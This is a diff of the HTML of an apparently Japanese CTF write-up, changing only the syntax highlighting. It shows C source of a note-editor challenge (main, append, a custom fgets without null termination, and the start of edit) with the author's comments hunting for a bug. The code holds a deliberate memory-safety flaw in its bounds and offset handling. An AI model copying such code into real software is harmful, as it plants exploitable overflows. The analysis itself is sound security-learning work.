-</span><span>        </span><span style="color:#8fbfdc;">case </span><span style="color:#cf6a4c;">1</span><span>: </span><span style="color:#888888;">// &lt;- 問題なさそう
-</span><span>            </span><span style="color:#ffb964;">reset</span><span>(&amp;note);
-</span><span>            </span><span style="color:#8fbfdc;">break</span><span>;
-</span><span>        </span><span style="color:#8fbfdc;">case </span><span style="color:#cf6a4c;">2</span><span>: </span><span style="color:#888888;">// &lt;- 問題なさそう
-</span><span>            printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Current note content:\n\&quot;\&quot;\&quot;\n</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>            puts(note.</span><span style="color:#ffb964;">buffer</span><span>);
-</span><span>            printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\&quot;\&quot;\&quot;\n</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>            </span><span style="color:#8fbfdc;">break</span><span>;
-</span><span>        </span><span style="color:#8fbfdc;">case </span><span style="color:#cf6a4c;">3</span><span>: </span><span style="color:#888888;">// &lt;- 一見して問題無さそう
-</span><span>            </span><span style="color:#ffb964;">append</span><span>(&amp;note);
-</span><span>            </span><span style="color:#8fbfdc;">break</span><span>;
-</span><span>        </span><span style="color:#8fbfdc;">case </span><span style="color:#cf6a4c;">4</span><span>:
-</span><span>            </span><span style="color:#ffb964;">edit</span><span>(&amp;note);
-</span><span>            </span><span style="color:#8fbfdc;">break</span><span>;
-</span><span>        </span><span style="color:#8fbfdc;">case </span><span style="color:#cf6a4c;">5</span><span>:
-</span><span>            </span><span style="color:#ffb964;">truncate</span><span>(&amp;note);
-</span><span>            </span><span style="color:#8fbfdc;">break</span><span>;
-</span><span>        </span><span style="color:#8fbfdc;">case </span><span style="color:#cf6a4c;">6</span><span>: </span><span style="color:#888888;">// fall trough to exit &lt;-問題無さそう
-</span><span>            printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Bye\n</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>            </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">0</span><span>;
-</span><span>        </span><span style="color:#8fbfdc;">default</span><span>:
-</span><span>            printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Exiting due to error or invalid action.\n</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>            exit(</span><span style="color:#cf6a4c;">1</span><span>);
-</span><span>        }
-</span><span>    }
-</span><span>}
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">define</span><span style="color: #7AA2F7;"> NOTE_SIZE</span><span style="color: #FF9E64;"> 1024</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">struct</span><span> Note </span><span style="color: #9ABDF5;">{</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    char</span><span style="color: #89DDFF;">*</span><span style="color: #9ABDF5;"> buffer</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    size_t</span><span style="color: #9ABDF5;"> size</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    uint32_t</span><span style="color: #9ABDF5;"> budget</span><span style="color: #89DDFF;">;</span><span style="color: #9ABDF5;"> </span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    uint32_t</span><span style="color: #9ABDF5;"> pos</span><span style="color: #89DDFF;">;</span><span style="color: #9ABDF5;"> </span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">typedef</span><span style="color: #BB9AF7;"> struct</span><span> Note Note</span><span style="color: #89DDFF;">;</span></span></code></pre><pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #BB9AF7;">int</span><span style="color: #7AA2F7;"> main</span><span style="color: #9ABDF5;">() {</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    Note note</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    char</span><span style="color: #C0CAF5;"> buffer</span><span style="color: #9ABDF5;">[NOTE_SIZE]</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    </span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    note </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> (Note) {</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        .buffer </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> buffer</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        .size </span><span style="color: #89DDFF;">= sizeof</span><span style="color: #9ABDF5;">(buffer)</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        .pos </span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">,</span><span style="color: #51597D;font-style: italic;"> // -&gt; bufferでのoffsetを持っていると思われる。書き込み位置</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        .budget </span><span style="color: #89DDFF;">= sizeof</span><span style="color: #9ABDF5;">(buffer)</span><span style="color: #51597D;font-style: italic;"> // -&gt; 残りのバッファサイズ?</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    }</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">	</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">	//これは setvbufとかの設定で関係ない</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    setup</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    // bufferをsizeのbyte分だけ0埋め、budget = size、pos=0にする</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    reset</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&amp;</span><span style="color: #7AA2F7;">note</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    </span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Welcome to the terminal note editor as a service.</span><span style="color: #89DDFF;">\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">	// メニューは1-6以外を受け付けていない</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    while</span><span style="color: #9ABDF5;"> (</span><span style="color: #FF9E64;">1</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        uint32_t</span><span style="color: #9ABDF5;"> choice </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> menu</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        switch</span><span style="color: #9ABDF5;"> (choice)</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        case</span><span style="color: #FF9E64;"> 1</span><span style="color: #89DDFF;">:</span><span style="color: #51597D;font-style: italic;"> // &lt;- 問題なさそう</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            reset</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&amp;</span><span style="color: #E0AF68;">note</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            break</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        case</span><span style="color: #FF9E64;"> 2</span><span style="color: #89DDFF;">:</span><span style="color: #51597D;font-style: italic;"> // &lt;- 問題なさそう</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Current note content:</span><span style="color: #89DDFF;">\n\&quot;\&quot;\&quot;\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            puts</span><span style="color: #9ABDF5;">(note.buffer)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;\&quot;\&quot;\&quot;\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            break</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        case</span><span style="color: #FF9E64;"> 3</span><span style="color: #89DDFF;">:</span><span style="color: #51597D;font-style: italic;"> // &lt;- 一見して問題無さそう</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            append</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&amp;</span><span style="color: #E0AF68;">note</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            break</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        case</span><span style="color: #FF9E64;"> 4</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            edit</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&amp;</span><span style="color: #E0AF68;">note</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            break</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        case</span><span style="color: #FF9E64;"> 5</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            truncate</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&amp;</span><span style="color: #E0AF68;">note</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            break</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        case</span><span style="color: #FF9E64;"> 6</span><span style="color: #89DDFF;">:</span><span style="color: #51597D;font-style: italic;"> // fall trough to exit &lt;-問題無さそう</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Bye</span><span style="color: #89DDFF;">\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            return</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7DCFFF;">        default</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Exiting due to error or invalid action.</span><span style="color: #89DDFF;">\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            exit</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">1</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        }</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    }</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre>
 <p>appendは以下。</p>
-<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">append</span><span>(Note* </span><span style="color:#ffb964;">note</span><span>) {
-</span><span>    printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Append something to your note (</span><span style="color:#7697d6;">%u</span><span style="color:#99ad6a;"> bytes left):\n</span><span style="color:#556633;">&quot;</span><span>, note-&gt;budget);
-</span><span>    fgets(note-&gt;buffer + note-&gt;pos, note-&gt;budget, stdin);
-</span><span>    uint32_t written = strcspn(note-&gt;buffer + note-&gt;pos, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>) + </span><span style="color:#cf6a4c;">1</span><span>;
-</span><span>    note-&gt;budget -= written;
-</span><span>    note-&gt;pos += written;
-</span><span>}
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #BB9AF7;">void</span><span style="color: #7AA2F7;"> append</span><span style="color: #9ABDF5;">(</span><span>Note</span><span style="color: #89DDFF;">*</span><span style="color: #E0AF68;"> note</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Append something to your note (</span><span style="color: #C0CAF5;">%u</span><span style="color: #9ECE6A;"> bytes left):</span><span style="color: #89DDFF;">\n&quot;,</span><span style="color: #C0CAF5;"> note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">budget</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    fgets</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">buffer</span><span style="color: #89DDFF;"> +</span><span style="color: #C0CAF5;"> note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">pos</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">budget</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> stdin</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    uint32_t</span><span style="color: #9ABDF5;"> written </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> strcspn</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">buffer</span><span style="color: #89DDFF;"> +</span><span style="color: #C0CAF5;"> note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">pos</span><span style="color: #89DDFF;">, &quot;\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;"> +</span><span style="color: #FF9E64;"> 1</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">budget</span><span style="color: #89DDFF;"> -=</span><span style="color: #9ABDF5;"> written</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">pos</span><span style="color: #89DDFF;"> +=</span><span style="color: #9ABDF5;"> written</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre>
 <p><code>budget</code>は残りのバイト数として機能している。<br />
 <code>append</code>は<code>buffer+pos</code>の位置に書き込んでいる。<br />
 サイズは<code>budget</code>であり、<code>stdin</code>から入力を受け取る。<br />
@@ -266,75 +258,69 @@ strcspnは改行を探し、それまでの文字数+1の数を書き込んだ�
 <code>strcspn</code>はバッファに指定した文字が現れるまでの文字数を数える。<br />
 <code>hello, world</code>で<code>o</code>を探したら、0オリジンで4が返ってくる。<br />
 もし見つからない場合、バッファの長さが返ってくる。</p>
-<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">char </span><span>*buf = </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Hello, world!\n</span><span style="color:#556633;">&quot;</span><span>;
-</span><span style="color:#8fbfdc;">int</span><span> num = strcspn(buf, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">o</span><span style="color:#556633;">&quot;</span><span>);
-</span><span style="color:#888888;">// -&gt; num = 4
-</span><span>
-</span><span style="color:#8fbfdc;">char </span><span>*buf = </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Hello, world!\n</span><span style="color:#556633;">&quot;</span><span>;
-</span><span style="color:#8fbfdc;">int</span><span> num = strcspn(buf, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">a</span><span style="color:#556633;">&quot;</span><span>);
-</span><span style="color:#888888;">// -&gt; num = 14
-</span><span>
-</span><span style="color:#8fbfdc;">char </span><span>*buf = </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Hello, world!\n</span><span style="color:#556633;">&quot;</span><span>;
-</span><span style="color:#8fbfdc;">int</span><span> num = strcspn(buf, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>);
-</span><span style="color:#888888;">// -&gt; num = 13
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #BB9AF7;">char</span><span style="color: #89DDFF;"> *</span><span>buf </span><span style="color: #89DDFF;">= &quot;</span><span style="color: #9ECE6A;">Hello, world!</span><span style="color: #89DDFF;">\n&quot;;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">int</span><span> num </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> strcspn</span><span style="color: #9ABDF5;">(</span><span>buf</span><span style="color: #89DDFF;">, &quot;</span><span style="color: #9ECE6A;">o</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">// -&gt; num = 4</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">char</span><span style="color: #89DDFF;"> *</span><span>buf </span><span style="color: #89DDFF;">= &quot;</span><span style="color: #9ECE6A;">Hello, world!</span><span style="color: #89DDFF;">\n&quot;;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">int</span><span> num </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> strcspn</span><span style="color: #9ABDF5;">(</span><span>buf</span><span style="color: #89DDFF;">, &quot;</span><span style="color: #9ECE6A;">a</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">// -&gt; num = 14</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">char</span><span style="color: #89DDFF;"> *</span><span>buf </span><span style="color: #89DDFF;">= &quot;</span><span style="color: #9ECE6A;">Hello, world!</span><span style="color: #89DDFF;">\n&quot;;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">int</span><span> num </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> strcspn</span><span style="color: #9ABDF5;">(</span><span>buf</span><span style="color: #89DDFF;">, &quot;\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">// -&gt; num = 13</span></span></code></pre>
 <p>あとfgetsが特殊</p>
-<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">char </span><span>*</span><span style="color:#fad07a;">fgets</span><span>(</span><span style="color:#8fbfdc;">char</span><span>* </span><span style="color:#ffb964;">s</span><span>, </span><span style="color:#8fbfdc;">int </span><span style="color:#ffb964;">size</span><span>, FILE *</span><span style="color:#8fbfdc;">restrict </span><span style="color:#ffb964;">stream</span><span>) {
-</span><span>    </span><span style="color:#8fbfdc;">char</span><span>* cursor = s;
-</span><span>    </span><span style="color:#8fbfdc;">for </span><span>(</span><span style="color:#8fbfdc;">int</span><span> i = </span><span style="color:#cf6a4c;">0</span><span>; i &lt; size -</span><span style="color:#cf6a4c;">1</span><span>; i++) {
-</span><span>        </span><span style="color:#8fbfdc;">int</span><span> c = getc(stream);
-</span><span>        </span><span style="color:#8fbfdc;">if </span><span>(c == EOF) </span><span style="color:#8fbfdc;">break</span><span>;
-</span><span>        *(cursor++) = c;
-</span><span>        </span><span style="color:#8fbfdc;">if </span><span>(c == </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&#39;</span><span>) </span><span style="color:#8fbfdc;">break</span><span>;
-</span><span>    }
-</span><span>    </span><span style="color:#888888;">// *cursor = &#39;\0&#39;; // our note is always null terminated
-</span><span>    </span><span style="color:#8fbfdc;">return</span><span> s;
-</span><span>}
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #BB9AF7;">char</span><span style="color: #89DDFF;"> *</span><span style="color: #7AA2F7;">fgets</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">char</span><span style="color: #89DDFF;">*</span><span style="color: #E0AF68;"> s</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> int</span><span style="color: #E0AF68;"> size</span><span style="color: #89DDFF;">,</span><span> FILE </span><span style="color: #89DDFF;">*</span><span style="color: #9D7CD8;font-style: italic;">restrict</span><span style="color: #E0AF68;"> stream</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    char</span><span style="color: #89DDFF;">*</span><span style="color: #9ABDF5;"> cursor </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> s</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    for</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">int</span><span style="color: #9ABDF5;"> i </span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span><span style="color: #9ABDF5;"> i </span><span style="color: #BB9AF7;">&lt;</span><span style="color: #9ABDF5;"> size </span><span style="color: #89DDFF;">-</span><span style="color: #FF9E64;">1</span><span style="color: #89DDFF;">;</span><span style="color: #9ABDF5;"> i</span><span style="color: #89DDFF;">++</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        int</span><span style="color: #9ABDF5;"> c </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> getc</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">stream</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        if</span><span style="color: #9ABDF5;"> (c </span><span style="color: #BB9AF7;">==</span><span style="color: #9ABDF5;"> EOF)</span><span style="color: #BB9AF7;"> break</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">        *</span><span style="color: #9ABDF5;">(cursor</span><span style="color: #89DDFF;">++</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> c</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        if</span><span style="color: #9ABDF5;"> (c </span><span style="color: #BB9AF7;">==</span><span style="color: #89DDFF;"> &#39;\n&#39;</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;"> break</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    }</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    // *cursor = &#39;\0&#39;; // our note is always null terminated</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    return</span><span style="color: #9ABDF5;"> s</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre>
 <p><code>edit</code>は以下。</p>
-<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">edit</span><span>(Note* </span><span style="color:#ffb964;">note</span><span>) {
-</span><span>    printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Give me an offset where you want to start editing: </span><span style="color:#556633;">&quot;</span><span>);
-</span><span>    uint32_t offset;
-</span><span>    </span><span style="color:#ffb964;">SCANLINE</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%u</span><span style="color:#556633;">&quot;</span><span>, &amp;offset);
-</span><span>    printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">How many bytes do you want to overwrite: </span><span style="color:#556633;">&quot;</span><span>);
-</span><span>    int64_t length;
-</span><span>    </span><span style="color:#ffb964;">SCANLINE</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%ld</span><span style="color:#556633;">&quot;</span><span>, &amp;length);
-</span><span>    </span><span style="color:#8fbfdc;">if </span><span>(offset &lt;= note-&gt;pos) {
-</span><span>        uint32_t lookback = (note-&gt;pos - offset);
-</span><span>        </span><span style="color:#8fbfdc;">if </span><span>(length &lt;= note-&gt;budget + lookback) {
-</span><span>            fgets(note-&gt;buffer + offset, length + </span><span style="color:#cf6a4c;">2</span><span>, stdin); </span><span style="color:#888888;">// plus newline and null byte
-</span><span>            uint32_t written = strcspn(note-&gt;buffer + offset, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>) + </span><span style="color:#cf6a4c;">1</span><span>;
-</span><span>            </span><span style="color:#8fbfdc;">if </span><span>(written &gt; lookback) {
-</span><span>                note-&gt;budget -= written - lookback;
-</span><span>                note-&gt;pos += written - lookback;
-</span><span>            }
-</span><span>        }
-</span><span>    } </span><span style="color:#8fbfdc;">else </span><span>{
-</span><span>        printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Maybe write something there first.\n</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>    }
-</span><span>}
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #BB9AF7;">void</span><span style="color: #7AA2F7;"> edit</span><span style="color: #9ABDF5;">(</span><span>Note</span><span style="color: #89DDFF;">*</span><span style="color: #E0AF68;"> note</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Give me an offset where you want to start editing: </span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    uint32_t</span><span style="color: #9ABDF5;"> offset</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    SCANLINE</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #C0CAF5;">%u</span><span style="color: #89DDFF;">&quot;, &amp;</span><span style="color: #7AA2F7;">offset</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">How many bytes do you want to overwrite: </span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    int64_t</span><span style="color: #9ABDF5;"> length</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    SCANLINE</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #C0CAF5;">%ld</span><span style="color: #89DDFF;">&quot;, &amp;</span><span style="color: #7AA2F7;">length</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    if</span><span style="color: #9ABDF5;"> (offset </span><span style="color: #BB9AF7;">&lt;=</span><span style="color: #C0CAF5;"> note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">pos</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        uint32_t</span><span style="color: #9ABDF5;"> lookback </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> (</span><span style="color: #C0CAF5;">note</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">pos</span><span style="color: #89DDFF;"> -</span><span style="color: #9ABDF5;"> offset)</span><span style="color: #89DDFF;">;</span></span>
